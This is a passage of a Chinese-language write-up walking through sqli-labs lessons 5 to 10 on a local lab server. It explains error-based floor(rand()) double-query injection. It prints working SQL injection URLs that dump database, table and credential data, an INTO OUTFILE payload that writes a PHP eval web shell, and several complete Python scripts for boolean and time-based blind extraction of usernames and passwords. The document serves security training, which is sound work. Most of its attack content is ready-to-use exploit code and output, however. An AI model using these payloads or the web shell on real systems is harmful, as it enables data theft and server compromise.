+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+------------------+----------+</span><br><span class="line">| floor(rand(0)*2) | count(*) |</span><br><span class="line">+------------------+----------+</span><br><span class="line">| 1                |        1 |</span><br><span class="line">|                  |          |</span><br><span class="line">|                  |          |</span><br><span class="line">+------------------+----------+</span><br></pre></td></tr></table></figure>
+<p>取第二条记录，第三次计算**floor(rand(0)*2)=1<strong>，这时虚拟表中已经存在</strong>1<strong>，则执行</strong>count++**。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+------------------+----------+</span><br><span class="line">| floor(rand(0)*2) | count(*) |</span><br><span class="line">+------------------+----------+</span><br><span class="line">| 1                |        2 |</span><br><span class="line">|                  |          |</span><br><span class="line">|                  |          |</span><br><span class="line">+------------------+----------+</span><br></pre></td></tr></table></figure>
+<p>再取第三条记录，第四次计算<strong>floor(rand(0)<em>2)=0<strong>，此时查询虚拟表中并不存在</strong>0<strong>，也就是无此记录，因此插入的时候开始第五次计算</strong>floor(rand(0)</em>2)=1</strong>。</p>
+<p>这时报错原理出来了。</p>
+<p>第五次计算得出的**floor(rand(0)*2)=1<strong>在插入时因为同之前已经插入过的</strong>1**重复，故抛出了报错信息。</p>
+<p>取三条数据，五次计算，因此使用<strong>rand(0)</strong>时至少需要三条以上数据才会报错。</p>
+<h5 id="x06-rand函数">0x06 rand()函数</h5>
+<p>相对于<strong>floor(rand(0)<em>2)<strong>而言，</strong>floor(rand()</em>2)</strong>由于没有加入随机因子所以计算的值是不固定的。</p>
+<p>取第一条记录，第一次计算<strong>floor(rand()<em>2)=0<strong>，虚拟表中无第一条记录，于是插入的时候第二次计算</strong>floor(rand()</em>2)=1</strong>，然后将结果插入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+------------------+----------+</span><br><span class="line">| floor(rand()*2)  | count(*) |</span><br><span class="line">+------------------+----------+</span><br><span class="line">| 1                |        1 |</span><br><span class="line">|                  |          |</span><br><span class="line">|                  |          |</span><br><span class="line">+------------------+----------+</span><br></pre></td></tr></table></figure>
+<p>取第二条记录，第三次计算<strong>floor(rand()<em>2)=0<strong>，这时虚拟表中不存在</strong>0<strong>，则插入时第四次计算</strong>floor(rand()</em>2)=1</strong>，冲突报错。</p>
+<p>但是倘若在前几次由于随机性，例如在上述步骤的第四次插入计算时**floor(rand()*2)=0**，查询出来的虚拟表成了这样。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+------------------+----------+</span><br><span class="line">| floor(rand()*2)  | count(*) |</span><br><span class="line">+------------------+----------+</span><br><span class="line">| 1                |        1 |</span><br><span class="line">| 0                |        1 |</span><br><span class="line">|                  |          |</span><br><span class="line">+------------------+----------+</span><br></pre></td></tr></table></figure>
+<p>那么后面不论查询几次都不会报错了，然后看题。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-5/?id=1&#x27; union select 1,2,count(*) as a from information_schema.tables group by concat((select database()),&#x27;-----&#x27;, floor(rand(0)*2)) --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Duplicate entry &#x27;security-----1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
+<p>再构造语句查询表名。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-5/?id=1&#x27; union select 1,2,count(*) as a from information_schema.tables group by concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),&#x27;-----&#x27;, floor(rand(0)*2)) --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Duplicate entry &#x27;users-----1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
+<p>后面几乎和之前的一样，只要构造嵌套的第二个select语句即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-5/?id=1&#x27; union select 1,2,count(*) as a from information_schema.tables group by concat((select column_name from information_schema.columns where  table_name=&#x27;users&#x27; limit 0,1),&#x27;-----&#x27;, floor(rand(0)*2)) --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Duplicate entry &#x27;id-----1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
+<p>这样从爆出全部字段。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-5/?id=1&#x27; union select 1,1,count(*) as a from information_schema.tables group by concat((select concat(username,&#x27; &#x27;,password) from users limit 0,1),&#x27;-----&#x27;, floor(rand(0)*2)) --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Duplicate entry &#x27;Dumb Dumb-----1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
+<h4 id="less-6-基于双查询的get双引号字符型注入">Less-6
+基于双查询的GET双引号字符型注入</h4>
+<p>一如<strong>Less-2</strong>相对于<strong>Less-1</strong>一样，同<strong>Less-5</strong>的<strong>payload</strong>差不多，改单引号为双引号即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-6/?id=1&quot; union select 1,1,count(*) as a from information_schema.tables group by concat((select concat(username,&#x27; &#x27;,password) from users limit 0,1),&#x27;-----&#x27;, floor(rand(0)*2)) --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Duplicate entry &#x27;Dumb Dumb-----1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
+<h3 id="x02-get导出文件注入">0x02 GET导出文件注入</h3>
+<h4 id="less-7-基于导出文件的get注入">Less-7 基于导出文件的GET注入</h4>
+<h5 id="相关补充-1">相关补充</h5>
+<h6 id="load_file">load_file()</h6>
+<p>该函数会读取文件并返回该文件的内容作为一个字符串，但有使用条件的限制。</p>
+<ol type="1">
+<li>必须有权限读取并且文件必须完全可读，**and (select count(*) from
+mysql.user)&gt;0**返回正常结果即有读写权限，反之亦然。</li>
+<li>欲读取文件必须在服务器上且需指定完整路径。</li>
+<li>欲读取文件必须小于<strong>max_allowed_packet</strong>。</li>
+</ol>
+<h6 id="load-data-infile">load data infile</h6>
+<p>该函数会从文件中读取行然后存入表中，当错误代码是<strong>2</strong>的时候的时候，文件不存在，错误代码为<strong>13</strong>的时候，没有权限。</p>
+<h6 id="select-...-into-outfile-file_name">select ... into outfile
+'file_name'</h6>
+<p>该函数会将查询到的结果写入文件。</p>
+<p>回到题目。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-7/?id=1&#x27;)) union select 1,2,3 into outfile &#x27;/var/www/html/Less-7/1.txt&#x27; --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan </span><br><span class="line"></span><br><span class="line">You have an error in your SQL syntax</span><br></pre></td></tr></table></figure>
+<p>虽然报错，但是访问该文件以及可以读取到注出的数据了，甚至可以写入小🐎。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-7/?id=1&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_post[&quot;south&quot;])?&gt;&#x27; into outfile &#x27;/var/www/html/Less-7/1.txt&#x27; --+</span><br></pre></td></tr></table></figure>
+<h3 id="x03-get单查询盲注">0x03 GET单查询盲注</h3>
+<h4 id="less-8-基于布尔的get单引号字符型盲注">Less-8
+基于布尔的GET单引号字符型盲注</h4>
+<p>根据提示，这是布尔盲注，即在不知道数据库返回值的情况下对数据库进行注入攻击，几个简单函数就不做赘述了。</p>
+<p>脚本跑出数据库名，这儿使用二分法。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-8/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">    payload = <span class="string">&quot;?id=1&#x27; and if(length(database())=&#123;length&#125;,1,0) --+&quot;</span></span><br><span class="line">    <span class="comment"># print payload</span></span><br><span class="line">    r = requests.get(url=url + payload.<span class="built_in">format</span>(length=<span class="built_in">str</span>(i)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="comment"># print i</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i + <span class="number">1</span>):</span><br><span class="line">            <span class="built_in">min</span> = <span class="number">48</span></span><br><span class="line">            <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">            <span class="keyword">while</span> <span class="built_in">min</span> &lt; <span class="built_in">max</span>:</span><br><span class="line">                payload = <span class="string">&quot;?id=1&#x27; and if(ascii(substr((database()),&#123;position&#125;,1))&#123;operator&#125;&#123;mid&#125;,1,0) --+&quot;</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">max</span> - <span class="built_in">min</span> == <span class="number">1</span>:</span><br><span class="line">                    r = requests.get(url=url + payload.<span class="built_in">format</span>(position=<span class="built_in">str</span>(j), operator=<span class="string">&quot;=&quot;</span>, mid=<span class="built_in">str</span>(mid)))</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        mid = <span class="built_in">max</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    mid = (<span class="built_in">max</span> + <span class="built_in">min</span>) // <span class="number">2</span></span><br><span class="line">                    r = requests.get(url=url + payload.<span class="built_in">format</span>(position=<span class="built_in">str</span>(j), operator=<span class="string">&quot;&gt;&quot;</span>, mid=<span class="built_in">str</span>(mid)))</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        <span class="built_in">min</span> = mid</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">max</span> = mid</span><br><span class="line">            result += <span class="built_in">chr</span>(mid)</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;\r%s&quot;</span> % result)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>获取表名。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-8/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">command = <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">    payload = <span class="string">&quot;?id=1&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))&gt;0,1,0) --+&quot;</span></span><br><span class="line">    r = requests.get(url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="comment"># print i</span></span><br><span class="line">        <span class="built_in">min</span> = <span class="number">0</span></span><br><span class="line">        <span class="built_in">max</span> = <span class="number">255</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">min</span> &lt; <span class="built_in">max</span>:</span><br><span class="line">            <span class="comment"># 注出第一个表的表名</span></span><br><span class="line">            payload = <span class="string">&quot;?id=1&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))&#123;operator&#125;&#123;mid&#125;,1,0) --+&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">max</span> - <span class="built_in">min</span> == <span class="number">1</span>:</span><br><span class="line">                r = requests.get(</span><br><span class="line">                    url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i), operator=<span class="string">&quot;=&quot;</span>, mid=<span class="built_in">str</span>(mid)))</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    mid = <span class="built_in">max</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mid = (<span class="built_in">max</span> + <span class="built_in">min</span>) // <span class="number">2</span></span><br><span class="line">                r = requests.get(</span><br><span class="line">                    url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i), operator=<span class="string">&quot;&gt;&quot;</span>, mid=<span class="built_in">str</span>(mid)))</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="built_in">min</span> = mid</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">max</span> = mid</span><br><span class="line">        result += <span class="built_in">chr</span>(mid)</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;\r%s&quot;</span> % result)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>获取表中字段数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-8/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">command = <span class="string">&quot;select count(column_name) from information_schema.columns where table_schema=&#x27;eight&#x27; and table_name=&#x27;flag&#x27;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">    payload = <span class="string">&quot;?id=1&#x27; and (&#123;command&#125;)=&#123;position&#125; --+&quot;</span></span><br><span class="line">    r = requests.get(url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
+<p>获取表中字段名。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-8/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">command = <span class="string">&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">    payload = <span class="string">&quot;?id=1&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))&gt;0,1,0) --+&quot;</span></span><br><span class="line">    r = requests.get(url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="comment"># print i</span></span><br><span class="line">        <span class="built_in">min</span> = <span class="number">0</span></span><br><span class="line">        <span class="built_in">max</span> = <span class="number">255</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">min</span> &lt; <span class="built_in">max</span>:</span><br><span class="line">            <span class="comment"># 注出第一个表的表名</span></span><br><span class="line">            payload = <span class="string">&quot;?id=1&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))&#123;operator&#125;&#123;mid&#125;,1,0) --+&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">max</span> - <span class="built_in">min</span> == <span class="number">1</span>:</span><br><span class="line">                r = requests.get(</span><br><span class="line">                    url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i), operator=<span class="string">&quot;=&quot;</span>, mid=<span class="built_in">str</span>(mid)))</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    mid = <span class="built_in">max</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mid = (<span class="built_in">max</span> + <span class="built_in">min</span>) // <span class="number">2</span></span><br><span class="line">                r = requests.get(</span><br><span class="line">                    url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i), operator=<span class="string">&quot;&gt;&quot;</span>, mid=<span class="built_in">str</span>(mid)))</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="built_in">min</span> = mid</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">max</span> = mid</span><br><span class="line">        result += <span class="built_in">chr</span>(mid)</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;\r%s&quot;</span> % result)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>得到全部字段。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-8/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">command = <span class="string">&quot;select group_concat(username,&#x27; &#x27;,password) from users&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    payload = <span class="string">&quot;?id=1&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))&gt;0,1,0) --+&quot;</span></span><br><span class="line">    r = requests.get(url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="comment"># print i</span></span><br><span class="line">        <span class="built_in">min</span> = <span class="number">0</span></span><br><span class="line">        <span class="built_in">max</span> = <span class="number">255</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">min</span> &lt; <span class="built_in">max</span>:</span><br><span class="line">            <span class="comment"># 注出第一个表的表名</span></span><br><span class="line">            payload = <span class="string">&quot;?id=1&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))&#123;operator&#125;&#123;mid&#125;,1,0) --+&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">max</span> - <span class="built_in">min</span> == <span class="number">1</span>:</span><br><span class="line">                r = requests.get(</span><br><span class="line">                    url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i), operator=<span class="string">&quot;=&quot;</span>, mid=<span class="built_in">str</span>(mid)))</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    mid = <span class="built_in">max</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mid = (<span class="built_in">max</span> + <span class="built_in">min</span>) // <span class="number">2</span></span><br><span class="line">                r = requests.get(</span><br><span class="line">                    url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i), operator=<span class="string">&quot;&gt;&quot;</span>, mid=<span class="built_in">str</span>(mid)))</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="built_in">min</span> = mid</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">max</span> = mid</span><br><span class="line">        result += <span class="built_in">chr</span>(mid)</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;\r%s&quot;</span> % result)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h4 id="less-9-基于时间的get单引号字符型盲注">Less-9
+基于时间的GET单引号字符型盲注</h4>
+<p>在没有任何输出显示的时候，可以使用时间盲注，利用数据库的延时语句来注入，脚本和上一题大同小异，使用了<strong>sleep()</strong>函数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-9/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">command = <span class="string">&quot;select group_concat(username,&#x27; &#x27;,password) from users&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    startTime = time.time()</span><br><span class="line">    payload = <span class="string">&quot;?id=1&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))&gt;0,sleep(2),1) --+&quot;</span></span><br><span class="line">    r = requests.get(url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i)))</span><br><span class="line">    <span class="keyword">if</span> time.time() - startTime &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            payload = <span class="string">&quot;?id=1&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))=&#123;mid&#125;,sleep(2),1) --+&quot;</span></span><br><span class="line">            startTime = time.time()</span><br><span class="line">            r = requests.get(</span><br><span class="line">                url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i), mid=<span class="built_in">str</span>(j)))</span><br><span class="line">            <span class="keyword">if</span> time.time() - startTime &gt; <span class="number">2</span>:</span><br><span class="line">                result += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        sys.stdout.write(<span class="string">&quot;\r%s&quot;</span> % result)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h4 id="less-10-基于时间的get双引号字符型盲注">Less-10
+基于时间的GET双引号字符型盲注</h4>
+<p>。。没啥好说的，改个双引号闭合就行了。</p>
+<h3 id="x04-post单查询注入">0X04 POST单查询注入</h3>
+<h4 id="less-11-基于错误的post单引号字符型注入">Less-11
